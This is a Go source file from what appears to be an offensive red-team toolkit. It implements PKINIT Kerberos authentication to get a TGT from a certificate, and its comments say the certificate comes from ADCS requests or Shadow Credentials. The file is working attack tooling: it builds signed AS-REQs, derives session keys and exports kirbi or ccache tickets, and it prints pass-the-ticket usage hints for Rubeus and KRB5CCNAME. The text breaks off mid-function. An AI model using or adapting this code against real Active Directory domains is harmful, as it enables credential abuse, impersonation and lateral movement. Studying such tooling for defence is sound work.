// ticket_pkinit.go implements PKINIT (RFC 4556 / MS-PKCA) for certificate-based
// Kerberos pre-authentication. Allows obtaining a TGT using a certificate (from
// ADCS request or Shadow Credentials) instead of a password/hash.

package commands

import (
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"math/big"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"

	gokrb5asn1 "github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/config"
	krbcrypto "github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// PKINIT OIDs
var (
	oidSignedData      = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 2}
	oidPKINITAuthData  = gokrb5asn1.ObjectIdentifier{1, 3, 6, 1, 5, 2, 3, 1}
	oidSHA1            = gokrb5asn1.ObjectIdentifier{1, 3, 14, 3, 2, 26}
	oidSHA256          = gokrb5asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 2, 1}
	oidSHA1WithRSA     = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 1, 5}
	oidECDSAWithSHA256 = gokrb5asn1.ObjectIdentifier{1, 2, 840, 10045, 4, 3, 2}
	oidDHPublicNumber  = gokrb5asn1.ObjectIdentifier{1, 2, 840, 10046, 2, 1}
	oidContentType     = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 9, 3}
	oidMessageDigest   = gokrb5asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 9, 4}
)

// IKE Group 2 (1024-bit MODP) parameters from RFC 2412 Appendix E.2.
// Windows KDC PKINIT only supports this group; Group 14 causes encKeyPack fallback.
var (
	dhGroupP, _ = new(big.Int).SetString(
		"00FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"+
			"29024E088A67CC74020BBEA63B139B22514A08798E3404DD"+
			"EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"+
			"E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"+
			"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65381"+
			"FFFFFFFFFFFFFFFF", 16)
	dhGroupG = big.NewInt(2)
)

// PKINIT ASN.1 types per RFC 4556 and MS-PKCA.

type pkAuthenticator struct {
	CUSec      int                    `asn1:"explicit,tag:0"`
	CTime      time.Time              `asn1:"generalized,explicit,tag:1"`
	Nonce      int                    `asn1:"explicit,tag:2"`
	PaChecksum []byte                 `asn1:"explicit,tag:3"`
}

type authPack struct {
	PKAuthenticator   pkAuthenticator       `asn1:"explicit,tag:0"`
	ClientPublicValue gokrb5asn1.RawValue   `asn1:"optional"`
	ClientDHNonce     []byte                `asn1:"optional,explicit,tag:3"`
}

type algorithmIdentifier struct {
	Algorithm  gokrb5asn1.ObjectIdentifier
	Parameters gokrb5asn1.RawValue `asn1:"optional"`
}

type subjectPublicKeyInfo struct {
	Algorithm algorithmIdentifier
	PublicKey gokrb5asn1.BitString
}

type dhParams struct {
	P *big.Int
	G *big.Int
	Q *big.Int
}

type contentInfo struct {
	ContentType gokrb5asn1.ObjectIdentifier
	Content     gokrb5asn1.RawValue `asn1:"explicit,tag:0"`
}

type signedData struct {
	Version          int
	DigestAlgorithms gokrb5asn1.RawValue `asn1:"set"`
	EncapContentInfo encapContentInfo
	Certificates     gokrb5asn1.RawValue `asn1:"optional,tag:0"`
	SignerInfos      gokrb5asn1.RawValue `asn1:"set"`
}

type encapContentInfo struct {
	EContentType gokrb5asn1.ObjectIdentifier
	EContent     gokrb5asn1.RawValue `asn1:"optional,explicit,tag:0"`
}

// PA-PK-AS-REQ per RFC 4556 Section 3.2.1.
type paPkAsReq struct {
	SignedAuthPack []byte              `asn1:"tag:0"`
	TrustedCAs     gokrb5asn1.RawValue `asn1:"optional,tag:1"`
	KDCPKId        []byte              `asn1:"optional,tag:2"`
}

// PA-PK-AS-REP DH variant (DHRepInfo) per RFC 4556 Section 3.2.3.
type paPkAsRepDH struct {
	DHSignedData  []byte `asn1:"tag:0"`
	ServerDHNonce []byte `asn1:"optional,explicit,tag:1"`
}

type kdcDHKeyInfo struct {
	SubjectPublicKey gokrb5asn1.BitString `asn1:"explicit,tag:0"`
	Nonce            int                  `asn1:"explicit,tag:1"`
	DHKeyExpiration  time.Time            `asn1:"generalized,optional,explicit,tag:2"`
}

type pkinitCertKey struct {
	Cert       *x509.Certificate
	Key        crypto.PrivateKey
	CertDER    []byte
}

// ReplyKeyPack per RFC 4556 Section 3.2.3
type replyKeyPack struct {
	ReplyKey   encryptionKeyASN1 `asn1:"explicit,tag:0"`
	ASChecksum checksumASN1      `asn1:"explicit,tag:1"`
}

type encryptionKeyASN1 struct {
	KeyType  int    `asn1:"explicit,tag:0"`
	KeyValue []byte `asn1:"explicit,tag:1"`
}

type checksumASN1 struct {
	CKSumType int    `asn1:"explicit,tag:0"`
	Checksum  []byte `asn1:"explicit,tag:1"`
}

func ticketPKINIT(args ticketArgs) structs.CommandResult {
	if args.Realm == "" || args.Server == "" {
		return errorResult("Error: realm and server (KDC) are required for pkinit")
	}
	if args.Username == "" {
		return errorResult("Error: username is required (SAN/UPN from certificate or explicit)")
	}

	certPEM := args.Certificate
	keyPEM := args.PrivateKey
	if certPEM == "" || keyPEM == "" {
		return errorResult("Error: certificate and private_key are required for pkinit")
	}

	// If values look like file paths, read the files
	certPEM = readIfPath(certPEM)
	keyPEM = readIfPath(keyPEM)

	realm := strings.ToUpper(args.Realm)
	if args.Format == "" {
		args.Format = "kirbi"
	}

	// Parse certificate and private key
	ck, err := parsePEMCertKey(certPEM, keyPEM)
	if err != nil {
		return errorf("Error loading certificate/key: %v", err)
	}

	// Resolve KDC
	kdcAddr := args.Server
	if !strings.Contains(kdcAddr, ":") {
		kdcAddr += ":88"
	}

	// Create gokrb5 config
	cfgStr := fmt.Sprintf(
		"[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n"+
			"[realms]\n  %s = {\n    kdc = %s\n  }\n",
		realm, realm, kdcAddr)
	cfg, err := config.NewFromString(cfgStr)
	if err != nil {
		return errorf("Error creating Kerberos config: %v", err)
	}

	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{args.Username},
	}

	// Build AS-REQ
	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		return errorf("Error building AS-REQ: %v", err)
	}

	// PKINIT typically uses AES256
	asReq.ReqBody.EType = []int32{18, 17} // aes256-cts, aes128-cts

	// Marshal AS-REQ body for checksum
	bodyBytes, err := gokrb5asn1.Marshal(asReq.ReqBody)
	if err != nil {
		return errorf("Error marshaling AS-REQ body: %v", err)
	}

	// Generate DH key pair (IKE Group 2 / 1024-bit)
	dhPriv, dhPubBytes, clientDHNonce, err := generateDHKeyPair()
	if err != nil {
		return errorf("Error generating DH key pair: %v", err)
	}

	// Build SubjectPublicKeyInfo for DH
	spki, err := buildDHSubjectPublicKeyInfo(dhPubBytes)
	if err != nil {
		return errorf("Error building DH SPKI: %v", err)
	}

	// Build PKAuthenticator
	now := time.Now().UTC()
	bodyChecksum := sha1.Sum(bodyBytes)
	pkAuth := pkAuthenticator{
		CUSec:      int(now.Nanosecond() / 1000),
		CTime:      now,
		Nonce:      int(asReq.ReqBody.Nonce),
		PaChecksum: bodyChecksum[:],
	}

	// Build AuthPack with clientDHNonce (required for key derivation)
	// RawValue.FullBytes bypasses struct tags, so pre-wrap SPKI in [1] EXPLICIT
	spkiTagged := derWrap(0xa1, spki)
	spkiRaw := gokrb5asn1.RawValue{FullBytes: spkiTagged}
	ap := authPack{
		PKAuthenticator:   pkAuth,
		ClientPublicValue: spkiRaw,
		ClientDHNonce:     clientDHNonce,
	}
	authPackBytes, err := gokrb5asn1.Marshal(ap)
	if err != nil {
		return errorf("Error marshaling AuthPack: %v", err)
	}

	// Sign the AuthPack with CMS SignedData
	signedAuthPack, err := buildCMSSignedData(authPackBytes, ck)
	if err != nil {
		return errorf("Error building CMS SignedData: %v", err)
	}

	// Build PA-PK-AS-REQ
	req := paPkAsReq{
		SignedAuthPack: signedAuthPack,
	}
	reqBytes, err := gokrb5asn1.Marshal(req)
	if err != nil {
		return errorf("Error marshaling PA-PK-AS-REQ: %v", err)
	}

	// Add PKINIT PA-DATA (type 16 = PA-PK-AS-REQ)
	asReq.PAData = types.PADataSequence{
		{PADataType: 16, PADataValue: reqBytes},
	}

	// Marshal and send AS-REQ
	asReqBytes, err := asReq.Marshal()
	if err != nil {
		return errorf("Error marshaling AS-REQ: %v", err)
	}

	respBuf, err := ticketKDCSendRaw(asReqBytes, kdcAddr)
	if err != nil {
		return errorf("%v", err)
	}

	// Check for KRB-ERROR
	if len(respBuf) > 0 && respBuf[0] == 0x7e {
		var krbErr messages.KRBError
		if err := krbErr.Unmarshal(respBuf); err == nil {
			errMsg := ticketKrbErrorMsg(krbErr.ErrorCode)
			if krbErr.EText != "" {
				errMsg += ": " + krbErr.EText
			}
			return errorf("KDC error: %s (code %d)", errMsg, krbErr.ErrorCode)
		}
	}

	// Parse AS-REP
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBuf); err != nil {
		return errorf("Error parsing AS-REP: %v", err)
	}

	// Extract PA-PK-AS-REP from response PA-DATA
	var paPkAsRepBytes []byte
	for _, pa := range asRep.PAData {
		if pa.PADataType == 17 { // PA-PK-AS-REP
			paPkAsRepBytes = pa.PADataValue
			break
		}
	}
	if paPkAsRepBytes == nil {
		return errorResult("Error: KDC response missing PA-PK-AS-REP (type 17)")
	}

	// Detect PA-PK-AS-REP variant: [0] DHRepInfo or [1] encKeyPack
	var rawRep gokrb5asn1.RawValue
	if _, err := gokrb5asn1.Unmarshal(paPkAsRepBytes, &rawRep); err != nil {
		return errorf("Error parsing PA-PK-AS-REP: %v", err)
	}
	repHdr := paPkAsRepBytes
	if len(repHdr) > 16 {
		repHdr = repHdr[:16]
	}
	diagInfo := fmt.Sprintf("PA-PK-AS-REP: tag=%d class=%d raw[0:16]=%x",
		rawRep.Tag, rawRep.Class, repHdr)

	var sessionKey types.EncryptionKey
	switch rawRep.Tag {
	case 0:
		// DH variant — extract KDC DH public key, compute shared secret
		var rep paPkAsRepDH
		// EXPLICIT [0] wraps the DHRepInfo SEQUENCE; rawRep.Bytes is the inner SEQUENCE TLV.
		if _, err := gokrb5asn1.Unmarshal(rawRep.Bytes, &rep); err != nil {
			return errorf("Error parsing PA-PK-AS-REP DH: %v", err)
		}
		kdcDHPub, err := extractKDCDHPublicKey(rep.DHSignedData)
		if err != nil {
			return errorf("Error extracting KDC DH key: %v", err)
		}
		sharedSecret := new(big.Int).Exp(kdcDHPub, dhPriv, dhGroupP)
		sharedSecretBytes := sharedSecret.Bytes()
		defer structs.ZeroBytes(sharedSecretBytes)

		var fullKey []byte
		fullKey = append(fullKey, sharedSecretBytes...)
		fullKey = append(fullKey, clientDHNonce...)
		fullKey = append(fullKey, rep.ServerDHNonce...)
		defer structs.ZeroBytes(fullKey)

		etype := int32(asRep.EncPart.EType)
		keySize := 32 // AES-256
		keyType := int32(18)
		if etype == 17 {
			keySize = 16 // AES-128
			keyType = 17
		}
		keyBytes := pkinitOctetstring2Key(fullKey, keySize)
		defer structs.ZeroBytes(keyBytes)
		sessionKey = types.EncryptionKey{KeyType: keyType, KeyValue: keyBytes}

	case 1:
		// encKeyPack variant — decrypt CMS EnvelopedData with our RSA key
		var err error
		sessionKey, err = decryptEncKeyPack(rawRep.Bytes, ck)
		if err != nil {
			return errorf("Error decrypting encKeyPack: %v | %s", err, diagInfo)
		}

	default:
		return errorf("Error: unexpected PA-PK-AS-REP tag: %d", rawRep.Tag)
	}

	// Decrypt the AS-REP EncPart using the session key
	plainBytes, err := krbcrypto.DecryptEncPart(asRep.EncPart, sessionKey, 3)
	if err != nil {
		return errorf("Error decrypting AS-REP: %v", err)
	}
	var decPart messages.EncKDCRepPart
	if err := decPart.Unmarshal(plainBytes); err != nil {
		return errorf("Error parsing decrypted AS-REP: %v", err)
	}

	// Use the session key from the decrypted reply (not our derived one)
	realSessionKey := decPart.Key
	sname := decPart.SName
	ticketFlags := decPart.Flags
	authTime := decPart.AuthTime
	endTime := decPart.EndTime
	renewTill := decPart.RenewTill

	// Format output
	var output string
	switch strings.ToLower(args.Format) {
	case "kirbi":
		kirbiBytes, err := ticketToKirbi(asRep.Ticket, realSessionKey, args.Username, realm, sname, ticketFlags, authTime, endTime, renewTill)
		if err != nil {
			return errorf("Error creating kirbi: %v", err)
		}
		output = pkinitFormatOutput(args.Username, realm, ck.Cert, realSessionKey, authTime, endTime, "kirbi", base64.StdEncoding.EncodeToString(kirbiBytes))
	case "ccache":
		ticketBytes, err := asRep.Ticket.Marshal()
		if err != nil {
			return errorf("Error marshaling ticket: %v", err)
		}
		ccacheBytes := ticketToCCache(ticketBytes, realSessionKey, args.Username, realm, sname, ticketFlags, authTime, endTime, renewTill)
		output = pkinitFormatOutput(args.Username, realm, ck.Cert, realSessionKey, authTime, endTime, "ccache", base64.StdEncoding.EncodeToString(ccacheBytes))
	default:
		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
	}

	return successResult(output)
}

func pkinitFormatOutput(username, realm string, cert *x509.Certificate, key types.EncryptionKey, authTime, endTime time.Time, format, b64 string) string {
	var sb strings.Builder
	sb.WriteString("[*] PKINIT AS exchange successful\n")
	sb.WriteString(fmt.Sprintf("    User:        %s@%s\n", username, realm))
	sb.WriteString(fmt.Sprintf("    Certificate: %s\n", cert.Subject.CommonName))
	sb.WriteString(fmt.Sprintf("    Issuer:      %s\n", cert.Issuer.CommonName))
	sb.WriteString(fmt.Sprintf("    Serial:      %s\n", cert.SerialNumber.Text(16)))
	sb.WriteString(fmt.Sprintf("    Session Key: etype %d (%d bytes)\n", key.KeyType, len(key.KeyValue)))
	sb.WriteString(fmt.Sprintf("    Valid:       %s — %s\n", authTime.Format("2006-01-02 15:04:05 UTC"), endTime.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Format:      %s\n", format))
	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", format, b64))
	if format == "kirbi" {
		sb.WriteString("\n[*] Usage: Rubeus.exe ptt /ticket:<base64>\n")
	} else {
		sb.WriteString("\n[*] Usage: echo '<base64>' | base64 -d > /tmp/krb5cc_pkinit\n")
		sb.WriteString("[*] Usage: export KRB5CCNAME=/tmp/krb5cc_pkinit\n")
	}
	return sb.String()
}

// parsePEMCertKey loads a certificate and private key from PEM-encoded strings.
func parsePEMCertKey(certPEM, keyPEM string) (*pkinitCertKey, error) {
	certBlock, _ := pem.Decode([]byte(certPEM))
	if certBlock == nil {
		return nil, fmt.Errorf("failed to decode certificate PEM")
	}
	cert, err := x509.ParseCertificate(certBlock.Bytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse certificate: %w", err)
	}

	keyBlock, _ := pem.Decode([]byte(keyPEM))
	if keyBlock == nil {
		return nil, fmt.Errorf("failed to decode private key PEM")
	}
	var key crypto.PrivateKey
	switch keyBlock.Type {
	case "RSA PRIVATE KEY":
		key, err = x509.ParsePKCS1PrivateKey(keyBlock.Bytes)
	case "EC PRIVATE KEY":
		key, err = x509.ParseECPrivateKey(keyBlock.Bytes)
	case "PRIVATE KEY":
		key, err = x509.ParsePKCS8PrivateKey(keyBlock.Bytes)
	default:
		return nil, fmt.Errorf("unsupported key type: %s", keyBlock.Type)
	}
	if err != nil {
		return nil, fmt.Errorf("failed to parse private key: %w", err)
	}

	return &pkinitCertKey{
		Cert:    cert,
		Key:     key,
		CertDER: certBlock.Bytes,
	}, nil
}

// generateDHKeyPair generates a DH key pair using IKE Group 2 (1024-bit).
// Also returns a 32-byte clientDHNonce for key derivation.
func generateDHKeyPair() (priv *big.Int, pubBytes []byte, clientNonce []byte, err error) {
	privBytes := make([]byte, 32)
	if _, err := rand.Read(privBytes); err != nil {
		return nil, nil, nil, fmt.Errorf("failed to generate DH private key: %w", err)
	}
	priv = new(big.Int).SetBytes(privBytes)

	pub := new(big.Int).Exp(dhGroupG, priv, dhGroupP)
	pubBytes = pub.Bytes()

	// Pad to 128 bytes (1024 bits)
	if len(pubBytes) < 128 {
		padded := make([]byte, 128)
		copy(padded[128-len(pubBytes):], pubBytes)
		pubBytes = padded
	}

	clientNonce = make([]byte, 32)
	if _, err := rand.Read(clientNonce); err != nil {
		return nil, nil, nil, fmt.Errorf("failed to generate DH nonce: %w", err)
	}

	return priv, pubBytes, clientNonce, nil
}

// buildDHSubjectPublicKeyInfo constructs a SubjectPublicKeyInfo for DH.
func buildDHSubjectPublicKeyInfo(pubBytes []byte) ([]byte, error) {
	params := dhParams{P: dhGroupP, G: dhGroupG, Q: big.NewInt(0)}
	paramsBytes, err := gokrb5asn1.Marshal(params)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal DH params: %w", err)
	}

	pubInt := new(big.Int).SetBytes(pubBytes)
	pubIntDER, err := gokrb5asn1.Marshal(pubInt)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal DH public key INTEGER: %w", err)
	}

	spki := subjectPublicKeyInfo{
		Algorithm: algorithmIdentifier{
			Algorithm:  oidDHPublicNumber,
			Parameters: gokrb5asn1.RawValue{FullBytes: paramsBytes},
		},
		PublicKey: gokrb5asn1.BitString{
			Bytes:     pubIntDER,
			BitLength: len(pubIntDER) * 8,
		},
	}
	return gokrb5asn1.Marshal(spki)
}

// buildCMSSignedData creates a CMS SignedData structure signing the AuthPack.
// Uses explicit DER construction for reliable encoding of CMS structures.
func buildCMSSignedData(authPackBytes []byte, ck *pkinitCertKey) ([]byte, error) {
	var digestOID, sigOID gokrb5asn1.ObjectIdentifier
	var hashFunc crypto.Hash
	switch ck.Key.(type) {
	case *rsa.PrivateKey:
		digestOID = oidSHA1
		sigOID = oidSHA1WithRSA
		hashFunc = crypto.SHA1
	case *ecdsa.PrivateKey:
		digestOID = oidSHA256
		sigOID = oidECDSAWithSHA256
		hashFunc = crypto.SHA256
	default:
		return nil, fmt.Errorf("unsupported key type for signing")
	}

	// Compute digest of AuthPack content
	h := hashFunc.New()
	h.Write(authPackBytes)
	digest := h.Sum(nil)

	// Build signed attributes as raw DER to avoid struct-level tag ambiguities.
	// Each Attribute: SEQUENCE { OID, SET OF { value } }
	contentTypeOIDBytes, _ := gokrb5asn1.Marshal(oidPKINITAuthData)
	ctAttrBytes := derSequence(
		derMarshal(oidContentType),
		derSet(contentTypeOIDBytes),
	)
	digestOctetBytes := derOctetString(digest)
	mdAttrBytes := derSequence(
		derMarshal(oidMessageDigest),
		derSet(digestOctetBytes),
	)

	// SET OF Attribute for signing (explicit SET tag 0x31)
	signedAttrsContent := append(ctAttrBytes, mdAttrBytes...)
	signedAttrsForSig := derWrap(0x31, signedAttrsContent)

	// Hash signed attributes and sign
	h2 := hashFunc.New()
	h2.Write(signedAttrsForSig)
	attrDigest := h2.Sum(nil)

	var signature []byte
	var err error
	switch key := ck.Key.(type) {
	case *rsa.PrivateKey:
		signature, err = rsa.SignPKCS1v15(rand.Reader, key, hashFunc, attrDigest)
	case *ecdsa.PrivateKey:
		signature, err = ecdsa.SignASN1(rand.Reader, key, attrDigest)
	}
	if err != nil {
		return nil, fmt.Errorf("failed to sign: %w", err)
	}

	// Signed attrs in SignerInfo use IMPLICIT [0] (tag 0xa0)
	signedAttrsTagged := derWrap(0xa0, signedAttrsContent)

	// Build SignerInfo SEQUENCE
	issuerBytes, _ := gokrb5asn1.Marshal(gokrb5asn1.RawValue{FullBytes: ck.Cert.RawIssuer})
	serialBytes, _ := gokrb5asn1.Marshal(ck.Cert.SerialNumber)
	sidBytes := derSequence(issuerBytes, serialBytes)

	digestAlgBytes := derAlgID(digestOID)
	sigAlgBytes := derAlgIDNoParams(sigOID)
	sigValueBytes := derOctetString(signature)

	versionBytes, _ := gokrb5asn1.Marshal(1)
	siBytes := derSequence(
		versionBytes,
		sidBytes,
		digestAlgBytes,
		signedAttrsTagged,
		sigAlgBytes,
		sigValueBytes,
	)

	// Build SignedData SEQUENCE
	sdVersionBytes, _ := gokrb5asn1.Marshal(3)
	digestAlgSetBytes := derSet(digestAlgBytes)

	eContentOctet := derOctetString(authPackBytes)
	eContentTypeBytes := derMarshal(oidPKINITAuthData)
	eContentExplicit := derWrap(0xa0, eContentOctet) // [0] EXPLICIT
	encapContentBytes := derSequence(eContentTypeBytes, eContentExplicit)

	certsImplicit := derWrap(0xa0, ck.CertDER)  // [0] IMPLICIT certificates
	siSetBytes := derSet(siBytes)

	sdBytes := derSequence(
		sdVersionBytes,
		digestAlgSetBytes,
		encapContentBytes,
		certsImplicit,
		siSetBytes,
	)

	// Wrap in ContentInfo
	sdOIDBytes := derMarshal(oidSignedData)
	sdExplicit := derWrap(0xa0, sdBytes) // [0] EXPLICIT content
	ciBytes := derSequence(sdOIDBytes, sdExplicit)

	return ciBytes, nil
}

// DER construction helpers

func derWrap(tag byte, content []byte) []byte {
	return append(derTL(tag, len(content)), content...)
}

func derTL(tag byte, length int) []byte {
	if length < 128 {
		return []byte{tag, byte(length)}
	}
	if length < 256 {
		return []byte{tag, 0x81, byte(length)}
	}
	return []byte{tag, 0x82, byte(length >> 8), byte(length)}
}

func derSequence(elements ...[]byte) []byte {
	var content []byte
	for _, e := range elements {
		content = append(content, e...)
	}
	return derWrap(0x30, content)
}

func derSet(elements ...[]byte) []byte {
	var content []byte
	for _, e := range elements {
		content = append(content, e...)
	}
	return derWrap(0x31, content)
}

func derOctetString(data []byte) []byte {
	return derWrap(0x04, data)
}

func derMarshal(v interface{}) []byte {
	b, _ := gokrb5asn1.Marshal(v)
	return b
}

func derAlgID(oid gokrb5asn1.ObjectIdentifier) []byte {
	oidBytes := derMarshal(oid)
	nullBytes := []byte{0x05, 0x00}
	return derSequence(oidBytes, nullBytes)
}

func derAlgIDNoParams(oid gokrb5asn1.ObjectIdentifier) []byte {
	oidBytes := derMarshal(oid)
	return derSequence(oidBytes)
}

// decryptEncKeyPack handles the encKeyPack [1] variant of PA-PK-AS-REP.
// Uses sequential element parsing to avoid Go ASN.1 struct-tag edge cases.
func decryptEncKeyPack(encKeyPackBytes []byte, ck *pkinitCertKey) (types.EncryptionKey, error) {
	// Parse outer ContentInfo
	var ci contentInfo
	if _, err := gokrb5asn1.Unmarshal(encKeyPackBytes, &ci); err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse ContentInfo: %w", err)
	}

	// ci.Content is the [0] EXPLICIT wrapper — .Bytes contains the EnvelopedData SEQUENCE TLV
	edBytes := ci.Content.Bytes
	if len(edBytes) == 0 {
		edBytes = ci.Content.FullBytes
	}
	var edSeq gokrb5asn1.RawValue
	if _, err := gokrb5asn1.Unmarshal(edBytes, &edSeq); err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse EnvelopedData SEQUENCE: %w", err)
	}
	remain := edSeq.Bytes

	dbg := fmt.Sprintf("ci.Content: tag=%d class=%d | edSeq: tag=%d bytesLen=%d | remain[0:8]=%x",
		ci.Content.Tag, ci.Content.Class, edSeq.Tag, len(edSeq.Bytes), remain[:min(8, len(remain))])

	// Element 1: version INTEGER
	var version int
	var err error
	remain, err = gokrb5asn1.Unmarshal(remain, &version)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse version: %w | %s", err, dbg)
	}
	dbg += fmt.Sprintf(" | ver=%d remainAfterVer=%d", version, len(remain))

	// Element 2: originatorInfo [0] IMPLICIT (optional, skip if present)
	if len(remain) > 0 && remain[0] == 0xa0 {
		var skip gokrb5asn1.RawValue
		if rest, err := gokrb5asn1.Unmarshal(remain, &skip); err == nil {
			remain = rest
		}
	}

	if len(remain) > 0 {
		dbg += fmt.Sprintf(" | nextTag=0x%02x", remain[0])
	}

	// Element 3: recipientInfos SET
	var riSet gokrb5asn1.RawValue
	remain, err = gokrb5asn1.Unmarshal(remain, &riSet)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse recipientInfos: %w | %s", err, dbg)
	}
	dbg += fmt.Sprintf(" | riSet: tag=%d class=%d bytesLen=%d", riSet.Tag, riSet.Class, len(riSet.Bytes))

	// Parse first KeyTransRecipientInfo from SET content
	riContent := riSet.Bytes
	if len(riContent) == 0 {
		riContent = riSet.FullBytes
	}
	dbg += fmt.Sprintf(" | riContent[0:min(8)]=%x", riContent[:min(8, len(riContent))])

	var ktriSeq gokrb5asn1.RawValue
	_, err = gokrb5asn1.Unmarshal(riContent, &ktriSeq)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse KTRI seq: %w | %s", err, dbg)
	}
	ktriRemain := ktriSeq.Bytes
	dbg += fmt.Sprintf(" | ktri: tag=%d bytesLen=%d", ktriSeq.Tag, len(ktriSeq.Bytes))

	var ktriVer int
	ktriRemain, err = gokrb5asn1.Unmarshal(ktriRemain, &ktriVer)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse KTRI ver: %w | %s", err, dbg)
	}
	var rid gokrb5asn1.RawValue
	ktriRemain, err = gokrb5asn1.Unmarshal(ktriRemain, &rid)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse KTRI rid: %w | %s", err, dbg)
	}
	dbg += fmt.Sprintf(" | ktriVer=%d ridTag=%d ridLen=%d", ktriVer, rid.Tag, len(rid.Bytes))

	var keyEncAlg algorithmIdentifier
	ktriRemain, err = gokrb5asn1.Unmarshal(ktriRemain, &keyEncAlg)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse keyEncAlg: %w | %s", err, dbg)
	}
	var encryptedKey []byte
	_, err = gokrb5asn1.Unmarshal(ktriRemain, &encryptedKey)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse encryptedKey: %w | %s", err, dbg)
	}
	dbg += fmt.Sprintf(" | alg=%v encKeyLen=%d", keyEncAlg.Algorithm, len(encryptedKey))

	// Decrypt CEK with our RSA private key
	rsaKey, ok := ck.Key.(*rsa.PrivateKey)
	if !ok {
		return types.EncryptionKey{}, fmt.Errorf("encKeyPack requires RSA private key")
	}

	// Verify our private key modulus matches cert public key
	certPubKey, ok2 := ck.Cert.PublicKey.(*rsa.PublicKey)
	if ok2 {
		dbg += fmt.Sprintf(" | keyMatch=%v keyBits=%d", rsaKey.N.Cmp(certPubKey.N) == 0, rsaKey.N.BitLen())
	}

	var cek []byte
	var oaep1Err, oaep256Err error
	cek, oaep1Err = rsa.DecryptOAEP(sha1.New(), rand.Reader, rsaKey, encryptedKey, nil)
	if oaep1Err != nil {
		cek, oaep256Err = rsa.DecryptOAEP(crypto.SHA256.New(), rand.Reader, rsaKey, encryptedKey, nil)
	}
	if oaep1Err != nil && oaep256Err != nil {
		return types.EncryptionKey{}, fmt.Errorf("decrypt CEK failed: oaep1=%v oaep256=%v | %s",
			oaep1Err, oaep256Err, dbg)
	}
	defer structs.ZeroBytes(cek)

	if len(cek) < 16 {
		return types.EncryptionKey{}, fmt.Errorf("CEK too short (%d bytes) | oaep1=%v | %s",
			len(cek), oaep1Err, dbg)
	}

	// Element 4: EncryptedContentInfo SEQUENCE
	var eciSeq gokrb5asn1.RawValue
	if _, err := gokrb5asn1.Unmarshal(remain, &eciSeq); err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse EncryptedContentInfo: %w | %s", err, dbg)
	}
	eciRemain := eciSeq.Bytes

	var eciContentType gokrb5asn1.ObjectIdentifier
	eciRemain, err = gokrb5asn1.Unmarshal(eciRemain, &eciContentType)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse ECI contentType: %w | %s", err, dbg)
	}
	var ceAlg algorithmIdentifier
	eciRemain, err = gokrb5asn1.Unmarshal(eciRemain, &ceAlg)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse ECI algorithm: %w | %s", err, dbg)
	}

	// Extract IV from content encryption algorithm parameters
	var iv []byte
	ivSrc := ceAlg.Parameters.FullBytes
	if len(ivSrc) == 0 {
		ivSrc = ceAlg.Parameters.Bytes
	}
	if len(ivSrc) > 0 {
		var rawIV gokrb5asn1.RawValue
		if _, err := gokrb5asn1.Unmarshal(ivSrc, &rawIV); err == nil {
			iv = rawIV.Bytes
		}
	}

	// Extract encrypted content [0] IMPLICIT OCTET STRING
	var encContentRaw gokrb5asn1.RawValue
	if _, err := gokrb5asn1.Unmarshal(eciRemain, &encContentRaw); err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse encrypted content: %w | %s", err, dbg)
	}
	encContent := encContentRaw.Bytes

	if len(encContent) == 0 {
		return types.EncryptionKey{}, fmt.Errorf("no encrypted content in EnvelopedData")
	}

	// AES-CBC decrypt
	block, err := aes.NewCipher(cek)
	if err != nil {
		return types.EncryptionKey{}, fmt.Errorf("create AES cipher: %w", err)
	}
	if len(iv) != block.BlockSize() {
		return types.EncryptionKey{}, fmt.Errorf("IV size %d != block size %d", len(iv), block.BlockSize())
	}
	if len(encContent)%block.BlockSize() != 0 {
		return types.EncryptionKey{}, fmt.Errorf("encrypted content size %d not aligned to block size", len(encContent))
	}
	decrypted := make([]byte, len(encContent))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(decrypted, encContent)

	// Remove PKCS#7 padding
	if padLen := int(decrypted[len(decrypted)-1]); padLen > 0 && padLen <= block.BlockSize() {
		decrypted = decrypted[:len(decrypted)-padLen]
	}

	// Decrypted content is CMS SignedData wrapping ReplyKeyPack (RFC 4556 §3.2.3)
